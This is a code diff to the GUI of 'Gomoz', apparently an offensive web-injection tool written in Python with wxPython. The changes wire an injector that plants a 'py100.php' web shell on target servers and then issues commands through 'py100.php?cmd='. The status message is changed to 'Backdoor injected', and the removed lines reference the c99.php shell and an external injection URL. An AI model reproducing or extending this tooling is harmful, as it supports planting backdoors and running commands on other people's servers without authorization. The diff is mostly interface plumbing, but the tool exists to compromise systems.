@@ -162,7 +162,7 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
         self.enabled = True
         self.menulogic=True
         self.frame.popupmenu = wx.Menu()
-        self.frame.startmenu = self.frame.popupmenu.Append(-1, "Restart scan")
+        self.frame.startmenu = self.frame.popupmenu.Append(-1, "Localhost shell")
         bmp = wx.Bitmap("Gomoz/image/new_scan.png", wx.BITMAP_TYPE_PNG)
         self.frame.startmenu.SetBitmap(bmp)
         
@@ -191,7 +191,7 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
         bmp = wx.Bitmap("Gomoz/image/remove16.png", wx.BITMAP_TYPE_PNG)
         self.frame.deletemenu.SetBitmap(bmp)
 
-        self.frame.Bind(wx.EVT_MENU, self.OnPopupItemSelected, self.frame.startmenu)
+        self.frame.Bind(wx.EVT_MENU, self.OnLocalShell, self.frame.startmenu)
         self.frame.Bind(wx.EVT_MENU, self.OnInjectCmd, self.frame.injectmenu)
         self.frame.Bind(wx.EVT_MENU, self.OnServerInfo, self.frame.servermenu)
         self.frame.Bind(wx.EVT_MENU, self.OnBrowse, self.frame.browsemenu)
@@ -212,17 +212,18 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
          else :
            index = self.frame.lc_sources.GetFirstSelected()
 
-           dico=self.SetData('~Gomoz/config/gomoz.cfg')
+           dico=self.SetData('Gomoz/config/gomoz.cfg')
            while index != -1:
                 request=self.frame.lc_sources.GetItem(index, 0).GetText()
                 server=self.frame.lc_sources.GetItem(index, 1).GetText()
+                path=self.frame.lc_sources.GetItem(index, 2).GetText()
                 index = self.frame.lc_sources.GetNextSelected(index)
-                result=injector.Injector(server, dico['OPTscan'], 'c99.php', 'py100.php','')
+                result=injector.Injector(server, dico['OPTscan'], path, 'py100.php','')
                 rs=result.start()
                 #if injected
                 count=1
                 self.frame.tc_url.SetValue("py100.php?cmd=")
-                gstatusbar.GomozStatusBar.SetStatusText(self.frame.statusbar, str(count)+ " owned", 1)
+                gstatusbar.GomozStatusBar.SetStatusText(self.frame.statusbar, "Backdoor injected", 1)
                 wx.MessageBox("%s is '%s'" % ('server','rs'), 'Info') 
                 self.enabled=True
                 tab.append([request,server,'rs'])
@@ -347,6 +348,11 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
         tab.SetName(name)        
 
 
+
+    def OnLocalShell(self, event):
+        pass
+
+
     def OnConsole(self, event):
         # we must create a console stack on onterwin, to handle consoles
         index=gmenubar.GomozMenuBar.GetSelection(self.frame.menu)
@@ -369,46 +375,12 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
         self.frame.notebook.AddPage(self.frame.notebook_console, (consoles))
         self.frame.notebook_console.SetForegroundColour(wx.WHITE)
         item = self.frame.notebook_console
-            
-##        req1 = "self.frame.notebook_console_%s = wx.Panel(self.frame.notebook, -1)" % request
-##        exec ("print self.frame.notebook_console_%s % request")
-##        req2 = "self.frame.notebook_console_%s.SetAutoLayout(True)" % request
-##        req3 = "self.frame.notebook_console_%s.SetBackgroundColour('wx.BLACK')" % request
-##        req4 = "self.frame.notebook.AddPage(self.frame.notebook_console_%s, (consoles))" % request
-##        req5 = "self.frame.notebook_console_%s.SetForegroundColour(wx.WHITE)" % request
-##        req6 = "item = \"self.frame.notebook_console_%s\"" % request
-##        for i in range(1,7):
-##            t="exec(req%s)" % i
-##        exec(t)
-        
-
-
-
         self.frame.c_stack[request]=item
-        #print self.frame.c_stack[request]
-        
-        #self.frame.c_stack[request].Close()
-
-        test=console.GomozConsole(self.frame.notebook_console, -1, '%', "user@"+consoles+":~ ")
-        """ 
-        url='http://'+str(consoles)+'/'
-        print url
-        print exploit
-        include=self.frame.tc_url.GetValue()
-        if include is None or include=='':
-            test.SetParams(url, str(exploit), '')
+        if consoles=='localhost' and exploit=="":
+            test=console.GomozConsole(self.frame.notebook_console, -1, '%', "user@"+consoles+":~ ", "local")
         else:
-            test.SetParams(url, str(include), '')
-        """
-
-        #test.SetUrl(url='http://iberoriente.net/inj.php?md=')
-        #app.MainLoop()
-        
-        #self.notebook_console.Bind(wx.EVT_CONTEXT_MENU, self.OnShowMenuConsole)        
-        #the name of tab, has to be checked
-        #self.frame.label=wx.StaticText(self.frame.notebook_console, -1, ("["+console+"]$ _"))
-        #self.frame.label.SetFont(wx.Font(8, wx.ROMAN, wx.NORMAL, wx.BOLD))
-          
+            test=console.GomozConsole(self.frame.notebook_console, -1, '%', "user@"+consoles+":~ ", "")
+            
 
     def OnBrowse(self, event):
 
@@ -433,15 +405,7 @@ class CheckListCtrl(wx.lib.mixins.listctrl.ColumnSorterMixin, threading.Thread):
         print exploit
             
         webbrowser.open("http://"+browser+exploit)
-    
-        #self.frame.notebook_browser = wx.Panel(self.frame.notebook, -1, size=(200,200))
-        #self.frame.notebook_browser.SetBackgroundColour('yellow')
-        #self.frame.notebook.AddPage(self.frame.notebook_browser, ("http://"+browser+'/'))
-        ##self.panel=wx.Panel(self.frame.notebook_browser, -1, size=(200,200))
-        #frm = gbrowser.GomozBrowser(self.frame.notebook_browser)
-        ##frm.geturl('http://127.0.0.1:8080/')
-        ##frm.Show()
-        ##app.MainLoop()
+  
 
     def OnColClick(self, event):
         pass
